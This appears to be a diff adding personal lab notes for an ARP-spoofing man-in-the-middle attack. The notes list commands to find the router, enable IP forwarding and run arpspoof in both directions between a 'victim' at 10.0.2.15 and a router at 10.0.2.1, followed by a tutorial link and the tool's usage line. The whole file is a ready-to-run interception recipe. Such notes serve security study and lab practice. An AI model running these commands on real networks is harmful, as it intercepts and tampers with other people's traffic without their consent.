@@ -1,0 +1,8 @@
+arp -a //router's ip
+
+echo 1 > /proc/sys/net/ipv4/ip_forward    //forward victim's request to router
+arpspoof -i eth0  -t 10.0.2.1 10.0.2.15  //attacker tells router that I am the victim
+arpspoof -i eth0  -t 10.0.2.15 10.0.2.1  //ttacker tells victim that I am the router
+
+https://www.irongeek.com/i.php?page=security/arpspoof
+arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
